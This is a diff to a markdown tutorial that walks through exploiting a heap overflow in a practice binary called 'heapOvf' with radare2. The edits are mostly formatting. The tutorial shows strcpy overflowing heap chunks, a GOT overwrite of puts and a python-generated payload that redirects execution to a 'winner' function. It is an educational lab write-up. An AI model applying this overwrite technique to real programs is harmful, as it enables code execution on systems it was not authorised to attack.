@@ -32,19 +32,19 @@ Let's check the assembly (yay!)
 
 ## Firing the Radare
 
-`radare2 -AA ./heapOvf`
+`radare2 -AA ./heapOvf`\
 Here, the `-AA` is to start the analyse with `aaaa` at the execution.\
 
-Then we go to the main and print the code :\
+Then we go to the main and print the code :
 ```
 [0x080491df]> s main
 [0x080491df]> pdf
 ```
 
 ![](https://github.com/ZigzagSecurity/survival-guide-radare2/blob/master/heap_overflow/main.png)
-The obvious things here are the 4 malloc (so the heap is used) and the 2 strcopy probably of our arguments (yew that smell like an entry point)\
+The obvious things here are the 4 malloc (so the heap is used) and the 2 strcopy probably of our arguments (yew that smell like an entry point)
 
-We can also check if we have any interesting function :\
+We can also check if we have any interesting function :
 ```
 [0xf7fd1079]> afl
 0x08049000    3 32           sym._init
@@ -69,7 +69,7 @@ We can also check if we have any interesting function :\
 0x08049334    1 20           sym._fini
 ```
 
-ok so we have the winner function let's take a look.\
+ok so we have the winner function, let's take a look.
 ```
 [0xf7fd1079]> pdf @sym.winner
 / (fcn) sym.winner 61
@@ -98,11 +98,11 @@ ok so we have the winner function let's take a look.\
 |           0x080491dd      c9             leave
 \           0x080491de      c3             ret
 ```
-It prints something so that must be the flag. But this function is never called in the main, that's surely the goal of the exploitation, calling "winner".\
+It prints something so that must be the flag. But this function is never called in the main, that's surely the goal of the exploitation, calling "winner".
 
 ## Examining the heap
 
-OK, we should check what is done with the heap. First, we charge the binary in debug mode with our 2 arguments and execute it.\
+OK, we should check what is done with the heap. First, we charge the binary in debug mode with our 2 arguments and execute it.
 ```
 [0x080491df]> ood AAAA BBBB
 Process with PID 12124 started...
@@ -112,7 +112,7 @@ File dbg:///home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf  
 [0xf7faf0b0]> dc
 And that's it !
 ```
-Everything goes as wished, so it's time to find he heap. Radare has few commands to display the memory maps and best for now is `dm` :\
+Everything goes as wished, so it's time to find he heap. Radare has few commands to display the memory maps and best for now is `dm` :
 ```
 [0xf7fd1079]> dm
 0x08048000 - 0x08049000 - usr     4K s r-- /home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf /home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf ; segment.ehdr
@@ -138,18 +138,19 @@ Everything goes as wished, so it's time to find he heap. Radare has few commands
 0xf7ffb000 - 0xf7ffc000 - usr     4K s rw- /lib32/ld-2.28.so /lib32/ld-2.28.so
 0xffe13000 - 0xffe34000 - usr   132K s rw- [stack] [stack] ; map.stack_.rw
 ```
-So now we have the libs, the stack and the heap localization. We can print our heap to take a closer look.
+So now we have the libs, the stack and the heap localization. We can print our heap to take a closer look. 
 
 ![](https://github.com/ZigzagSecurity/survival-guide-radare2/blob/master/heap_overflow/heap.png)
 
-We clearly see arguments copied in the heap in to different chuncks and also two chunck that have a 1 or a 2 and the address from where our arguments start.\
+We clearly see arguments copied in the heap in to different chuncks and also two chunck that have a 1 or a 2 and the address from where our arguments start.
 
+You can also check all different combination of command to have a look at the heap or other sections. Like `dmh` and so on, never forget to use the "?" to have some help on your command.
 
 ## Exploit
 So we have a program that takes 2 arguments and put them on the heap. But it uses "strcopy", it's not safe cause there is no limitation on what's copied.\
 We can surely use that to overwrite the heap and have some control on the strcopy.
 
-Ok let's have a good old buffer overflow ! Recharge our binary :\
+Ok let's have a good old buffer overflow ! Recharge our binary :
 ```
 [0xf7e11079]> ood AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH 00001111222233334444
 Wait event received by different pid 12573
@@ -165,16 +166,18 @@ Unable to find filedescriptor 6
 child stopped with signal 11
 [+] SIGNAL 11 errno=0 addr=0x46464646 code=1 ret=0
 ```
-ok we have a segfault with 0x46, that's F in hexa, seems like we have something here. let's see our heap again :\
+ok we have a segfault with 0x46, that's F in hexa, seems like we have something here.\
+let's see our heap again :\
 ![](https://github.com/ZigzagSecurity/survival-guide-radare2/blob/master/heap_overflow/heap2.png)
 
-So we have the FFFF right where we normally have the starting address of our second argument. Then we can specify anywhere we want to write our second argument.\
+So we have the FFFF right where we normally have the starting address of our second argument. Then we can specify anywhere we want to write our second argument.
 
-The thing here would be to overwrite the call of "puts" after all the strcopy to call "winner" instead. To do that, we can overwrite the address of "puts" on the Global Offset Table and replace it by the "winner" address.
+The thing here would be to overwrite the call of "puts" after all the strcopy to call "winner" instead.\
+To do that, we can overwrite the address of "puts" on the Global Offset Table and replace it by the "winner" address.
 
 ### Let's try
 
-First we can get the two addresses we need :\
+First we can get the two addresses we need :
 ```
 [0xf7d7c079]> afl ~puts
 0x08049070    1 6            sym.imp.puts
@@ -202,7 +205,7 @@ OFFSET   TYPE              VALUE
 0x080491a2    1 61           sym.winner
 [0xf7d7c079]> 
 ```
-So, we display the address of puts with "afl" and the grep command for radare, the "~". Then get the code of the function. We see that it's basically just a jump the address on the GOT, the real adress of puts. We can verify it with "objdump", it's possible to execute a command like we could do outside radare with the "!" prefix. And finally, we have the address of winner.\
+So, we display the address of puts with "afl" and the grep command for radare, the "~". Then get the code of the function. We see that it's basically just a jump the address on the GOT, the real adress of puts. We can verify it with "objdump", it's possible to execute a command like we could do outside radare with the "!" prefix. And finally, we have the address of winner.
 
 We can now try to overwrite puts in the GOT :
 ```
@@ -239,11 +242,11 @@ eflags 1ASIV       eflags
 [0x30303030]> 
 ```
 
-A little bit of explanation on the above. We charged the binary with the arguments, you can see that I used the little trick with the backtick, the exclamation mark and python. The backticks are necessarily for radare to understand that the python command stands for argument. The "!" is here to execute the python command and the python is here to put the hexadecimal values for the address.\
+A little bit of explanation on the above. We charged the binary with the arguments, you can see that I used the little trick with the backtick, the exclamation mark and python. The backticks are necessarily for radare to understand that the python command stands for argument. The "!" is here to execute the python command and the python is here to put the hexadecimal values for the address.
 
 During the exeecution we got a segfault as we predict because the binary tried to execute the function at the address 0x30303030 (thanks to our second argument). We can see with the command `drr` that this address is in the eip so we are good to go !
 
-Let's replace, the 0000 with the winner's address :\
+Let's replace, the 0000 with the winner's address :
 ```
 [0xf7f76079]> ood `!python -c "print 'AAAABBBBCCCCDDDDEEEE\x1c\xc0\x04\x08 \xa2\x91\x04\x08'"`
 Wait event received by different pid 13539
@@ -269,6 +272,6 @@ Last step, we need to know if it works outside radare, but normally it does.
 zigzag@System:~/Documents/survival-guide-radare2/ $ ./heapOvf $(python -c "print 'AAAABBBBCCCCDDDDEEEE\x1c\xc0\x04\x08 \xa2\x91\x04\x08'")
 and we have a winner @ 1552847092
 ```
-Here we go, everything works as expected !\
+Here we go, everything works as expected !
 
-Thanks for reading guys and I hope you learnt some new stuff :)
+Thanks for reading guys and I hope you have learnt some new stuff :)
